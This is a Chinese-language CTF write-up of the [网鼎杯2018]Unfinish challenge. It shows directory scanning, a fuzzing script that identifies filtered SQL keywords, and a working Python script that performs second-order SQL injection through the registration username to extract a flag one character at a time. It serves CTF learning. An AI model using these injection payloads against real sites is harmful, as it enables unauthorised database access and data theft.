# [网鼎杯2018]Unfinish

#SQL #二次注入

进入网页，发现登录页面，网址是/login.php，既然有登录页面，肯定有注册页面。用dirsearch扫一下，使用命令：

```bash
python dirsearch.py -u <http://d26627ba-6adc-4bd4-b2b4-57aa2adfafee.node4.buuoj.cn:81/> -e * --timeout=2 -t 1 -x 400,403,404,500,503,429 -w db/mylist.txt
```

[https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)

todo dirsearch扫不出来。。

-w参数表示使用自定义字典。发现以下文件：

```
register.php
index.php
login.php
```

尝试访问/register.php，发现注册页面。随便取一个名字，登陆后，发现页面回显用户名。先Fuzzing一下，使用代码：

```python
import requests
from bs4 import BeautifulSoup
import time
url = '<http://e86388ae-b622-42a7-b6ad-f90c5faa70a0.node4.buuoj.cn:81/>'
fuzzDictpath = "F:/code/CTF/fuzzDicts/"
fuzzDict = open(fuzzDictpath + "sqlDict/mysql.txt", 'r', encoding='utf-8')
fuzzlist = fuzzDict.read().splitlines()
for i in range(len(fuzzlist)):
    register = {'email':'{}@qq.com'.format(i),'username':fuzzlist[i],'password':'1'}
    req = requests.session()
    r1 = req.post(url + 'register.php',data = register)
    html = r1.text
    soup = BeautifulSoup(html, 'html.parser')
    if (soup.body.string == "\\nnnnnoooo!!!"):
        print(fuzzlist[i])
    time.sleep(1)
```

运行完之后，发现以下字符被过滤：

```python
information
INFORMATION
information_schema.tables
,
```

使用的fuzz字典为：

[WEB SQL Fuzz Dict](https://yym68686.top/WEB-SQL-Fuzz-Dict-7eae109526b743ca942a4973620e3ab1)

通过Fuzz，可知：

1. 因为过滤了逗号，所以不能进行报错注入，而且不能通过闭合INSERT后面的(A,B,C)来实现注入。同时也不能用substr(str, pos, len)，因为逗号被过滤了，查看官方文档：
   [MySQL SUBSTR() function - w3resource](https://www.w3resource.com/mysql/string-functions/mysql-substr-function.php)
   发现可以用 `substr(str from pos for len)`达到 `substr(str, pos, len)`一样的效果，同时绕过了逗号。
2. 因为information被过滤，所以不能获取表名，但也不能用sys库，因为在MySQL5.6或更高版本才有sys库，而本题mysql版本为5.5.64，显然不可用。所以只能猜测表名为flag。

猜测注册时SQL语句大概为：

```python
insert table values ('email','username','password')
```

可以通过闭合达到注入效果，可以想到是二次注入。可以这样闭合：

```sql
insert table values ('email','0'+ascii(substr((select * from flag) from {} for 1))+'0','password')
```

红色为我们的payload。把零删掉也可以：

```sql
insert table values ('email',''+ascii(substr((select * from flag) from {} for 1))+'','password')
```

编写代码：

```python
import requests
from bs4 import BeautifulSoup
import time
url = '<http://e86388ae-b622-42a7-b6ad-f90c5faa70a0.node4.buuoj.cn:81/>'
flag = ''
for i in range(100):
    payload = "0'+ascii(substr((select * from flag) from {} for 1))+'0".format(i + 1)
    register = {'email':'abc{}@qq.com'.format(i),'username':payload,'password':'123456'}
    login = {'email':'abc{}@qq.com'.format(i),'password':'123456'}
    req = requests.session()
    r1 = req.post(url + 'register.php',data = register)
    r2 = req.post(url + 'login.php', data = login)
    r3 = req.post(url + 'index.php')
    html = r3.text
    soup = BeautifulSoup(html, 'html.parser')
    UserName = soup.span.string.strip()
    if int(UserName) == 0:
        break
    flag += chr(int(UserName))
    print("\\r" + flag, end = "")
    time.sleep(1)
```

运行后得到flag。

当然也可以用双重hex来做。

References

[Python之requests模块-session](https://www.cnblogs.com/zhuosanxun/p/12679121.html)

[网鼎杯 2018 unfinish](https://codeantenna.com/a/1qCcdLe9eB)

[[网鼎杯2018]Unfinish](https://mayi077.gitee.io/2020/08/18/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/)

[[网鼎杯2018]Unfinish](https://www.cnblogs.com/h3ng/p/14380790.html)

[2018 网鼎杯 unfinish](https://zhuanlan.zhihu.com/p/150627938)

[[网鼎杯2018]Unfinish(二次注入)](https://guokeya.github.io/post/gW7Qnkxsi/)